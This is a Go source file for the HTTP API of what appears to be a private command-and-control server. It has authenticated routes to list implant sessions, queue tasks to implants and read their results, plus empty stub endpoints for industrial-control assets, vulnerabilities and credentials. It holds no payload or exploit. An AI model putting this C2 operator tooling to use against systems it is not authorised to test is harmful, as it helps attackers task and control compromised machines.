package httpapi

import (
	"embed"
	"encoding/json"
	"io/fs"
	"net/http"
	"strings"

	"github.com/azizbinmohammad/private-c2/server/c2"
)

//go:embed webui
var webUIFS embed.FS

type TaskRequest struct {
	Type string `json:"type"`
	Args string `json:"args"`
}

type TaskResponse struct {
	TaskID string `json:"task_id"`
}

type ErrorResponse struct {
	Error string `json:"error"`
}

type PendingResponse struct {
	Status string `json:"status"`
}

func NewRouter(implantServer *c2.ImplantServer) http.Handler {
	auth := NewAuthManager()

	mux := http.NewServeMux()

	// ── Public: login + static UI ──
	mux.HandleFunc("/api/auth/login", auth.LoginHandler())

	webUI, _ := fs.Sub(webUIFS, "webui")
	fileServer := http.FileServer(http.FS(webUI))
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" || r.URL.Path == "/index.html" {
			w.Header().Set("Cache-Control", "no-cache")
		}
		fileServer.ServeHTTP(w, r)
	})

	// ── Protected API routes ──
	api := http.NewServeMux()

	api.HandleFunc("/api/sessions", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		if r.URL.Path != "/api/sessions" {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
			return
		}
		if r.Method != http.MethodGet {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		sessions := implantServer.ListSessions()
		writeJSON(w, http.StatusOK, sessions)
	})

	api.HandleFunc("/api/sessions/", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		path := strings.TrimPrefix(r.URL.Path, "/api/sessions/")
		parts := strings.SplitN(path, "/", 2)
		sessionID := parts[0]

		if sessionID == "" {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "missing session ID"})
			return
		}

		if len(parts) == 1 {
			if r.Method != http.MethodGet {
				writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
				return
			}
			sess := implantServer.GetSession(sessionID)
			if sess == nil {
				writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "session not found"})
				return
			}
			writeJSON(w, http.StatusOK, sess)
			return
		}

		subpath := parts[1]
		if subpath == "task" {
			if r.Method != http.MethodPost {
				writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
				return
			}
			var req TaskRequest
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON: " + err.Error()})
				return
			}
			if req.Type == "" {
				writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "task type is required"})
				return
			}
			taskID, err := implantServer.QueueTask(sessionID, req.Type, req.Args)
			if err != nil {
				writeJSON(w, http.StatusNotFound, ErrorResponse{Error: err.Error()})
				return
			}
			writeJSON(w, http.StatusCreated, TaskResponse{TaskID: taskID})
			return
		}

		writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
	})

	api.HandleFunc("/api/tasks/", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		if r.Method != http.MethodGet {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		taskID := strings.TrimPrefix(r.URL.Path, "/api/tasks/")
		if taskID == "" {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "missing task ID"})
			return
		}
		result := implantServer.GetResult(taskID)
		if result == nil {
			writeJSON(w, http.StatusOK, PendingResponse{Status: "pending"})
			return
		}
		writeJSON(w, http.StatusOK, result)
	})

	// ── OT/ICS endpoints (read-only) ──
	api.HandleFunc("/api/ot/assets", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions { w.WriteHeader(http.StatusNoContent); return }
		writeJSON(w, http.StatusOK, []struct{}{})
	})
	api.HandleFunc("/api/ot/vulns", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions { w.WriteHeader(http.StatusNoContent); return }
		writeJSON(w, http.StatusOK, []struct{}{})
	})
	api.HandleFunc("/api/ot/credentials", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions { w.WriteHeader(http.StatusNoContent); return }
		writeJSON(w, http.StatusOK, []struct{}{})
	})
	api.HandleFunc("/api/ot/compliance", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions { w.WriteHeader(http.StatusNoContent); return }
		writeJSON(w, http.StatusOK, []struct{}{})
	})
	api.HandleFunc("/api/ot/topology", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions { w.WriteHeader(http.StatusNoContent); return }
		writeJSON(w, http.StatusOK, []struct{}{})
	})

	// Wire protected routes through auth middleware
	mux.Handle("/api/sessions", auth.Middleware(api))
	mux.Handle("/api/sessions/", auth.Middleware(api))
	mux.Handle("/api/tasks/", auth.Middleware(api))
	mux.Handle("/api/ot/", auth.Middleware(api))

	return mux
}

func setCORS(w http.ResponseWriter) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}
